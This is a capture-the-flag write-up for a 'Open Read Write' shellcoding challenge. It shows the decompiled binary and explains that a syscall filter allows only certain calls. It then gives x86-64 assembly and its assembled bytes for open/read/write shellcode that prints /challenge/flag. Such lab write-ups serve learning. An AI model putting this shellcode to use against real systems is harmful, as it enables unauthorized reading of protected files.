# Open Read Write

**Category:** Shellcoding

## Overview
```text
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  alarm(2u);
  buf = mmap(nullptr, 0x1000u, 7, 34, -1, 0);
  if ( !(unsigned int)install_syscall_filter() )
  {
    setvbuf(stdin, nullptr, 2, 0);
    setvbuf(stdout, nullptr, 2, 0);
    puts(
      "  _________.__           .__  .__                   .___      \n"
      " /   _____/|  |__   ____ |  | |  |   ____  ____   __| _/____  \n"
      " \\_____  \\ |  |  \\_/ __ \\|  | |  | _/ ___\\/  _ \\ / __ |/ __ \\ \n"
      " /        \\|   Y  \\  ___/|  |_|  |_\\  \\__(  <_> ) /_/ \\  ___/ \n"
      "/_______  /|___|  /\\___  >____/____/\\___  >____/\\____ |\\___  >\n"
      "        \\/      \\/     \\/               \\/           \\/    \\/ \n"
      "\n"
      "\n");
    read(0, buf, 0x200u);
    printf("Executing you shellcode.");
    __asm { jmp     rax }
  }
  return 1;
}
```

## Analysis
Similar structure to Back To Shell but in this binary there is an install_syscall_filter() that only allows certain syscalls to be executed.

From the name of the challenge we can assume that we have to open the flag file, read its content and write it to stdout. 

## Vulnerability
In this case the vulnerable line is: `__asm { jmp     rax }` that allows the attacker to execute a shellcode.


## Exploitation
The shellcode used is the following:

```text
mov rdi, rax
mov rax, 0x02       open syscall identifier
add rdi, 0x4e       points to the flag file
mov r14, rdi        copy rdi to r14
add r14, 0x12       r14 will be used as a buffer to save the flag content
mov rsi, 0
syscall
mov rdi, rax        move fd of the file opened to rdi
mov rax, 0x00       read syscall identifier
mov rsi, r14        where to read
mov rdx, 0x30       size of what to read
syscall
mov rsi, r14        buffer to write-> points to the part of the buffer containing the characters of the flag
mov rdi, 0x01       stdout fd
mov rax, 0x01       write syscall identifier
mov rdx, 0x30       size to print
syscall
```
The final shellcode is the compiled version of the given one with the flag path `/challenge/flag\0` appended at the end.

```python
r.sendline(b"\x48\x89\xC7\x48\xC7\xC0\x02\x00\x00\x00\x48\x83\xC7\x4E\x49\x89\xFE\x49\x83\xC6\x12\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x4C\x89\xF6\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05\x4C\x89\xF6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05/challenge/flag\0")
```

